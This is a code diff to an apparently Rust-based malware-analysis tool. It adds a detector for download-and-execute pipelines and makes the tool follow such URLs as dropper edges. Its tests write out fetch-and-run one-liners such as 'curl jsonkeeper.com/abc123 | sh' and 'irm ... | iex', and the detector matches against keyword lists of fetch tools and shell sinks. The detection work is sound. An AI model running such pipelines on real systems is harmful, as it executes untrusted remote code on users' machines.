@@ -936,6 +936,52 @@ fn looks_like_dropper_download_url(url: &str) -> bool {
     !(api_host || api_path) || explicit_download_path
 }
 
+/// A URL fetched directly into `IEX`/`Invoke-Expression` is a dropper edge even
+/// when its final path component is opaque (`/abc123`) or extensionless. The
+/// response is executable by construction, and these one-line fetch/evaluate
+/// forms are uncommon enough that following them is more useful than applying
+/// the ordinary download-shape filter. The evidence is the recognizer's full
+/// command line, so an unrelated URL elsewhere in a file does not qualify.
+fn is_eval_pipeline_url(reference: &Reference) -> bool {
+    if reference.kind != RefKind::UrlFetch {
+        return false;
+    }
+    if !reference.evidence.contains('|') {
+        return false;
+    }
+
+    let command_matches = |candidates: &[&str]| {
+        reference.evidence.split_whitespace().any(|word| {
+            let word = word.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-');
+            let lowered = word.to_ascii_lowercase();
+            let normalized = lowered
+                .strip_suffix(".exe")
+                .unwrap_or(&lowered)
+                .replace('-', "");
+            candidates.iter().any(|candidate| normalized == *candidate)
+        })
+    };
+
+    let fetch = command_matches(&[
+        "irm",
+        "iwr",
+        "curl",
+        "wget",
+        "invokerestmethod",
+        "invokewebrequest",
+    ]);
+    let execution_sink = command_matches(&[
+        "iex",
+        "invokeexpression",
+        "sh",
+        "bash",
+        "zsh",
+        "ash",
+        "dash",
+    ]);
+    fetch && execution_sink
+}
+
 /// A fetched dependency captured for upload to hopper as its own sample. Carries
 /// the standalone analysis report cleave produced for the dependency's bytes (the
 /// same report a first-hand `pkg:`/`url` scan yields, stripped and compacted),
@@ -1301,11 +1347,14 @@ pub(crate) fn orchestrate(
                             );
                             return false;
                         }
-                        if r.kind == RefKind::UrlFetch && !looks_like_dropper_download_url(url) {
+                        if r.kind == RefKind::UrlFetch
+                            && !looks_like_dropper_download_url(url)
+                            && !is_eval_pipeline_url(r)
+                        {
                             tracing::debug!(
                                 url = %url,
                                 source = %r.source,
-                                "URL does not look like a dropper download; fetch skipped"
+                                "URL does not look like a dropper download or eval pipeline; fetch skipped"
                             );
                             return false;
                         }
@@ -5024,6 +5073,28 @@ mod tests {
                 "site/API-shaped URL was kept: {url}"
             );
         }
+    }
+
+    #[test]
+    fn eval_pipeline_urls_are_followed_even_without_a_filename() {
+        let mut reference = url_ref("https://cdn.jsdelivr.net/gh/example/stage-opaque");
+        reference.evidence = "irm cdn.jsdelivr.net/gh/example/stage-opaque | iex".to_string();
+        assert!(!looks_like_dropper_download_url(
+            "https://cdn.jsdelivr.net/gh/example/stage-opaque"
+        ));
+        assert!(is_eval_pipeline_url(&reference));
+
+        reference.evidence = "curl jsonkeeper.com/abc123 | iex".to_string();
+        assert!(is_eval_pipeline_url(&reference));
+
+        reference.evidence = "curl jsonkeeper.com/abc123 | sh".to_string();
+        assert!(is_eval_pipeline_url(&reference));
+
+        reference.evidence = "wget cdn.jsdelivr.net/gh/example/stage | bash".to_string();
+        assert!(is_eval_pipeline_url(&reference));
+
+        reference.evidence = "curl https://example.test/stage-opaque".to_string();
+        assert!(!is_eval_pipeline_url(&reference));
     }
 
     #[test]
